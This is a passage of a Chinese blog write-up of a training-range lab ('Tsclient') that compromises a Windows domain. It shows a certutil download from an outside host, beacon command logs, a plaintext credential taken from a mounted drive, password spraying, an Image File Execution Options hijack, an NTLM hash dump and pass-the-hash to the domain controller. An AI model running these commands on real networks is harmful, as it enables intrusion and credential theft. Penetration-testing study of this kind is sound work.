+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">certutil <span class="operator">-f</span> <span class="operator">-split</span> <span class="literal">-urlcache</span> http://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">8080</span>/stowaway_windows/windows_x64_agent.exe C:\Users\Public\windows_x64_agent.exe</span><br><span class="line"></span><br><span class="line">linux_x64_admin <span class="literal">-l</span> <span class="number">1122</span></span><br><span class="line"></span><br><span class="line">windows_x64_agent.exe <span class="literal">-c</span> <span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1122</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/10.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/11.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/12.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/13.png"></p>
+<p>那么我们来整理一下资产吧</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">39.99</span>.<span class="number">131.64</span>   <span class="number">172.22</span>.<span class="number">8.18</span> 已拿下                mssql        弱口令 sa <span class="number">1</span>qaz!QAZ</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.15</span>     [+] DC:XIAORANG\DC01</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.31</span>     XIAORANG\WIN19<span class="literal">-CLIENT</span> </span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.46</span>     WIN2016.xiaorang.lab</span><br></pre></td></tr></table></figure>
+
+<p>信息收集一下</p>
+<p>查看有无在线用户</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell quser || qwinst</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/14.png"></p>
+<p>使用进程注入拿到这个用户的shell</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/15.png"></p>
+<p>查看挂载情况</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net use</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/16.png"></p>
+<p>可以看到挂载的C盘也为\TSCLIENT\</p>
+<p>靶机的名字</p>
+<p>查看一下有没有什么敏感信息</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">41</span>:<span class="number">05</span>] beacon&gt; shell <span class="built_in">dir</span> \\TSCLIENT\C</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">41</span>:<span class="number">05</span>] [*] Tasked beacon to run: <span class="built_in">dir</span> \\TSCLIENT\C</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">41</span>:<span class="number">05</span>] [+] host called home, sent: <span class="number">47</span> bytes</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">41</span>:<span class="number">05</span>] [+] received output:</span><br><span class="line"><span class="string">&#x27;\\TSCLIENT\C&#x27;</span></span><br><span class="line">用作为当前目录的以上路径启动了 CMD.EXE。</span><br><span class="line">UNC 路径不受支持。默认值设为 Windows 目录。</span><br><span class="line"> 驱动器 \\TSCLIENT\C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 C2C5<span class="literal">-9D0C</span></span><br><span class="line"></span><br><span class="line"> \\TSCLIENT\C 的目录</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span>/<span class="number">07</span>/<span class="number">12</span>  <span class="number">10</span>:<span class="number">34</span>                <span class="number">71</span> credential.txt</span><br><span class="line"><span class="number">2022</span>/<span class="number">05</span>/<span class="number">12</span>  <span class="number">17</span>:<span class="number">04</span>    &lt;<span class="built_in">DIR</span>&gt;          PerfLogs</span><br><span class="line"><span class="number">2022</span>/<span class="number">07</span>/<span class="number">11</span>  <span class="number">12</span>:<span class="number">53</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files</span><br><span class="line"><span class="number">2022</span>/<span class="number">05</span>/<span class="number">18</span>  <span class="number">11</span>:<span class="number">30</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files (x86)</span><br><span class="line"><span class="number">2022</span>/<span class="number">07</span>/<span class="number">11</span>  <span class="number">12</span>:<span class="number">47</span>    &lt;<span class="built_in">DIR</span>&gt;          Users</span><br><span class="line"><span class="number">2022</span>/<span class="number">07</span>/<span class="number">11</span>  <span class="number">12</span>:<span class="number">45</span>    &lt;<span class="built_in">DIR</span>&gt;          Windows</span><br><span class="line">               <span class="number">1</span> 个文件             <span class="number">71</span> 字节</span><br><span class="line">               <span class="number">5</span> 个目录 <span class="number">30</span>,<span class="number">035</span>,<span class="number">951</span>,<span class="number">616</span> 可用字节</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">41</span>:<span class="number">49</span>] beacon&gt; shell <span class="built_in">type</span> \\TSCLIENT\C\credential.txt</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">41</span>:<span class="number">49</span>] [*] Tasked beacon to run: <span class="built_in">type</span> \\TSCLIENT\C\credential.txt</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">41</span>:<span class="number">49</span>] [+] host called home, sent: <span class="number">63</span> bytes</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">41</span>:<span class="number">49</span>] [+] received output:</span><br><span class="line"><span class="string">&#x27;\\TSCLIENT\C&#x27;</span></span><br><span class="line">用作为当前目录的以上路径启动了 CMD.EXE。</span><br><span class="line">UNC 路径不受支持。默认值设为 Windows 目录。</span><br><span class="line">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Do</span> you know how to hijack Image?</span><br></pre></td></tr></table></figure>
+
+<p>可以看到提醒了映像劫持，还给了账号密码</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 <span class="literal">-q</span> crackmapexec smb <span class="number">172.22</span>.<span class="number">8.0</span>/<span class="number">24</span> <span class="literal">-u</span> <span class="string">&#x27;Aldrich&#x27;</span> <span class="literal">-p</span> <span class="string">&#x27;Ald@rLMWuy7Z!#&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/17.png"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># proxychains4 -q crackmapexec smb 172.22.8.0/24 -u &#x27;Aldrich&#x27; -p &#x27;Ald@rLMWuy7Z!#&#x27;</span></span><br><span class="line">/usr/lib/python3/dist<span class="literal">-packages</span>/paramiko/transport.py:<span class="number">219</span>: CryptographyDeprecationWarning: Blowfish has been deprecated and will be removed <span class="keyword">in</span> a future release</span><br><span class="line">  <span class="string">&quot;class&quot;</span>: algorithms.Blowfish,</span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">8.18</span>     <span class="number">445</span>    WIN<span class="literal">-WEB</span>          [*] Windows Server <span class="number">2016</span> Datacenter <span class="number">14393</span> x64 (name:WIN<span class="literal">-WEB</span>) (domain:WIN<span class="literal">-WEB</span>) (signing:False) (SMBv1:True)</span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">8.46</span>     <span class="number">445</span>    WIN2016          [*] Windows Server <span class="number">2016</span> Datacenter <span class="number">14393</span> x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)</span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">8.15</span>     <span class="number">445</span>    DC01             [*] Windows <span class="number">10.0</span> Build <span class="number">20348</span> x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">8.31</span>     <span class="number">445</span>    WIN19<span class="literal">-CLIENT</span>     [*] Windows <span class="number">10.0</span> Build <span class="number">17763</span> x64 (name:WIN19<span class="literal">-CLIENT</span>) (domain:xiaorang.lab) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">8.18</span>     <span class="number">445</span>    WIN<span class="literal">-WEB</span>          [-] WIN<span class="literal">-WEB</span>\Aldrich:Ald@rLMWuy7Z!<span class="comment"># STATUS_LOGON_FAILURE </span></span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">8.46</span>     <span class="number">445</span>    WIN2016          [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!<span class="comment"># STATUS_PASSWORD_EXPIRED </span></span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">8.15</span>     <span class="number">445</span>    DC01             [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!<span class="comment"># STATUS_PASSWORD_EXPIRED </span></span><br><span class="line">SMB         <span class="number">172.22</span>.<span class="number">8.31</span>     <span class="number">445</span>    WIN19<span class="literal">-CLIENT</span>     [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!<span class="comment"># STATUS_PASSWORD_EXPIRED </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/18.png"></p>
+<p>那么需要修改密码，其实kali直接rdp也可以修改密码（这里并没有成功）</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python smbpasswd.py xiaorang.lab/Aldrich:<span class="string">&#x27;Ald@rLMWuy7Z!#&#x27;</span>@<span class="number">172.22</span>.<span class="number">8.15</span> <span class="literal">-newpass</span> <span class="string">&#x27;Admin123$%&#x27;</span></span><br><span class="line"></span><br><span class="line">proxychains4 python3 smbpasswd.py xiaorang.lab/Aldrich:<span class="string">&#x27;Ald@rLMWuy7Z!#&#x27;</span>@<span class="number">172.22</span>.<span class="number">8.15</span> <span class="literal">-newpass</span> <span class="string">&#x27;Admin123$%&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 rdesktop <span class="literal">-u</span> Aldrich <span class="literal">-d</span> xiaorang.lab <span class="literal">-p</span> Ald@rLMWuy7Z <span class="literal">-g</span> <span class="number">1920</span>x1080 <span class="number">172.22</span>.<span class="number">8.15</span>:<span class="number">3389</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">kali</span>/<span class="type">red</span>/<span class="type">impacket</span>-<span class="number">0.11</span><span class="type">.0</span>/<span class="type">examples</span>]</span><br><span class="line">└─<span class="comment"># proxychains4 python3 smbpasswd.py xiaorang.lab/Aldrich:&#x27;Ald@rLMWuy7Z!#&#x27;@172.22.8.15 -newpass &#x27;Admin123$%&#x27;</span></span><br><span class="line">[<span class="type">proxychains</span>] config file found: /etc/proxychains4.conf</span><br><span class="line">[<span class="type">proxychains</span>] preloading /usr/lib/x86_64<span class="literal">-linux-gnu</span>/libproxychains.so.<span class="number">4</span></span><br><span class="line">[<span class="type">proxychains</span>] DLL init: proxychains<span class="literal">-ng</span> <span class="number">4.15</span></span><br><span class="line">Impacket v0.<span class="number">11.0</span> - Copyright <span class="number">2023</span> Fortra</span><br><span class="line"></span><br><span class="line">===============================================================================</span><br><span class="line">  Warning: This functionality will be deprecated <span class="keyword">in</span> the next Impacket version  </span><br><span class="line">===============================================================================</span><br><span class="line"></span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1123</span>  ...  <span class="number">172.22</span>.<span class="number">8.15</span>:<span class="number">445</span>  ...  OK</span><br><span class="line">[!] Password is expired, trying to bind with a null session.</span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1123</span>  ...  <span class="number">172.22</span>.<span class="number">8.15</span>:<span class="number">445</span>  ...  OK</span><br><span class="line">[*] Password was changed successfully.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>连域控发现连不上</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/19.png"></p>
+<p>转发上线</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect <span class="number">172.22</span>.<span class="number">8.46</span> <span class="number">8899</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/20.png"></p>
+<p>前面还提到了映像劫持</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get-acl</span> <span class="literal">-path</span> <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | <span class="built_in">fl</span> *</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/21.png"></p>
+<p>放大镜提权</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v <span class="string">&quot;Debugger&quot;</span> /t REG_SZ /d <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/22.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/23.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/24.png"></p>
+<p>在这里再次运行cs木马，连接，成功上线</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect <span class="number">172.22</span>.<span class="number">8.46</span> <span class="number">8899</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/25.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/26.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/27.png"></p>
+<p>信息收集，发现本地WIN2016$也在域管组内</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">11</span>:<span class="number">48</span>:<span class="number">08</span>] beacon&gt; shell net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">11</span>:<span class="number">48</span>:<span class="number">09</span>] [*] Tasked beacon to run: net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">11</span>:<span class="number">48</span>:<span class="number">09</span>] [+] host called home, sent: <span class="number">64</span> bytes</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">11</span>:<span class="number">48</span>:<span class="number">09</span>] [+] received output:</span><br><span class="line">这项请求将在域 xiaorang.lab 的域控制器处理。</span><br><span class="line"></span><br><span class="line">组名     Domain Admins</span><br><span class="line">注释     指定的域管理员</span><br><span class="line"></span><br><span class="line">成员</span><br><span class="line"></span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">Administrator            WIN2016<span class="variable">$</span>                 </span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>抓取密码本机密码进行横向</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/28.png"></p>
+<p>那么接下来就是pth了</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SID               : </span><br><span class="line">	msv :	</span><br><span class="line">	 [<span class="number">00000003</span>] Primary</span><br><span class="line">	 * Username : WIN2016<span class="variable">$</span></span><br><span class="line">	 * Domain   : XIAORANG</span><br><span class="line">	 * NTLM     : <span class="number">0</span>b7ee75356ad0ffa0902a954b9561a11</span><br><span class="line">	 * SHA1     : <span class="number">5</span>b852756a3ea35073888a569b3f72dc34600d101</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	kerberos :	</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py <span class="literal">-hashes</span> :<span class="number">0</span>b7ee75356ad0ffa0902a954b9561a11 xiaorang.lab/WIN2016<span class="variable">$</span>@<span class="number">172.22</span>.<span class="number">8.15</span> <span class="literal">-codec</span> gbk</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/29.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/30.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/31.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/32.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Hundredsu.github.io">Hundredsu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://hundredsu.github.io/post/72d64c19.html">https://hundredsu.github.io/post/72d64c19.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Hundredsu.github.io" target="_blank">Hundredsu'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">靶机渗透</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/post/c141a014.html" title="春秋云镜-Time"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">春秋云镜-Time</div></div><div class="info-2"><div class="info-item-1">信息收集39.98.115.43 fscan信息收集 12345678910111213141516171819D:\red\内网\免杀工具包\免杀工具包\fscan火绒6.0免杀版\未免杀5号黯区红队开发的fscan图形化和plus&gt;fscan.exe -h 39.98.115.43  ______                   _____  _ |  ____|                 |  __ \| | | |__ ___  ___ __ _ _ __ | |__) | |_   _ ___ |  __/ __|/ __/ _  |  _ \|  ___/| | | | / __| | |  \__ \ (_| (_| | | | | |    | | |_| \__ \ |_|  |___/\___\__,_|_| |_|_|    |_|\__,_|___/                     fscan version: 1.8.4 TeamdArk5 v1.0start infoscan39.98.115.43:22...</div></div></div></a><a class="pagination-related" href="/post/fa3212bf.html" title="红日2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">红日2</div></div><div class="info-2"><div class="info-item-1">开局一个ip 10.10.0.102  先扫一下端口吧 1234567891011121314151617181920212223242526272829D:\red\内网\免杀工具包\免杀工具包\fscan火绒6.0免杀版\未免杀5号黯区红队开发的fscan图形化和plus&gt;fscan.exe -h 10.10.0.102  ______                   _____  _ |  ____|                 |  __ \| | | |__ ___  ___ __ _ _ __ | |__) | |_   _ ___ |  __/ __|/ __/ _  |  _ \|  ___/| | | | / __| | |  \__ \ (_| (_| | | | | |    | | |_| \__ \ |_|  |___/\___\__,_|_| |_|_|    |_|\__,_|___/                     fscan version: 1.8.4 TeamdArk5 v1.0start...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/post/633b4305.html" title="春秋云镜–Aoselu"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">春秋云镜–Aoselu</div></div><div class="info-2"><div class="info-item-1">春秋云镜–Aoselu39.98.116.223 赛后复盘重打 写的不好，且比较乱，师傅自行判断借鉴 参考了官方的wp和一些其他的师傅的类型的打法wp 12345678910111213141516171819202122D:\red\内网\免杀工具包\免杀工具包\fscan火绒6.0免杀版\fscan2.0&gt;fscan.exe -h 39.98.116.223   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;\____/     |___/\___|_|  \__,_|\___|_|\_\                     fscan version: 2.0.0[*] 扫描类型: all, 目标端口:...</div></div></div></a><a class="pagination-related" href="/post/bf3976cc.html" title="cyberstrikelab-lab9"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">cyberstrikelab-lab9</div></div><div class="info-2"><div class="info-item-1">信息收集开局一个ip 172.5.33.6 fscan扫一下 12345678910111213141516171819202122232425262728293031D:\red\内网\免杀工具包\免杀工具包\fscan2.0.1&gt;fscan.exe -h 172.5.33.6┌──────────────────────────────────────────────┐│    ___                              _        ││   / _ \     ___  ___ _ __ __ _  ___| | __    ││  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    ││ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     ││ \____/     |___/\___|_|  \__,_|\___|_|\_\    │└──────────────────────────────────────────────┘     ...</div></div></div></a><a class="pagination-related" href="/post/662902bc.html" title="reddish"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">reddish</div></div><div class="info-2"><div class="info-item-1">看佬c1trus说是很难的靶机，但是能学东西，正好最近在学docker逃逸，打一打  信息收集10.10.10.94 tscan扫端口  只开放了一个端口1880 Mongo-Express Node.js 外围打点node-red-rce访问显示这个  那么我们post看一下  12345&#123;  &quot;id&quot;: &quot;ffec0b75777a00bc6e65ff2660896ad1&quot;,  &quot;ip&quot;: &quot;::ffff:10.10.16.38&quot;,  &quot;path&quot;:...</div></div></div></a><a class="pagination-related" href="/post/bdc052b9.html" title="春秋云镜-Delegation"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">春秋云镜-Delegation</div></div><div class="info-2"><div class="info-item-1">信息收集 http://39.99.128.241/ fscan直接扫  flag01 访问一下发现是cms，用poc扫一下，同时搜历史漏洞  扫出来了，但是我也搜到了其他的（具体的版本号可以登录后台后确定下来，但是也可以像这样直接探测一下）  访问admin，直接跳转 admin&#x2F;123456 直接登录成功 在模版处 修改 1&lt;?=system($_POST[a]);die();?&gt;   访问主页即可 主页会加载其他的模块内容  这里我用另一个poc 123456789101112131415POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1Host: 39.98.119.143Content-Length: 80X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...</div></div></div></a><a class="pagination-related" href="/post/38a9b672.html" title="春秋云镜-Brute4road"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">春秋云镜-Brute4road</div></div><div class="info-2"><div class="info-item-1">目标ip 信息收集 1fscan.exe -h 39.99.232.242   123456789101112131415161718192021  ______                   _____  _ |  ____|                 |  __ \| | | |__ ___  ___ __ _ _ __ | |__) | |_   _ ___ |  __/ __|/ __/ _  |  _ \|  ___/| | | | / __| | |  \__ \ (_| (_| | | | | |    | | |_| \__ \ |_|  |___/\___\__,_|_| |_|_|    |_|\__,_|___/                     fscan version: 1.8.4 TeamdArk5 v1.0start infoscan39.99.232.242:6379 open39.99.232.242:21 open39.99.232.242:22 open39.99.232.242:80 open[*] alive...</div></div></div></a><a class="pagination-related" href="/post/47d3d323.html" title="春秋云镜-Exchange"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">春秋云镜-Exchange</div></div><div class="info-2"><div class="info-item-1">参考wp： https://www.cnblogs.com/kingbridge/articles/16720318.html https://zer0peach.github.io/2024/12/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/ 开局一个ip39.99.153.253 fscan开扫 123456789101112131415161718192021222324D:\red\内网\免杀工具包\免杀工具包\fscan2.0.1&gt;fscan.exe -h 39.99.153.253┌──────────────────────────────────────────────┐│    ___                              _        ││   / _ \     ___  ___ _ __ __ _  ___| | __    ││  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    ││ /...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info 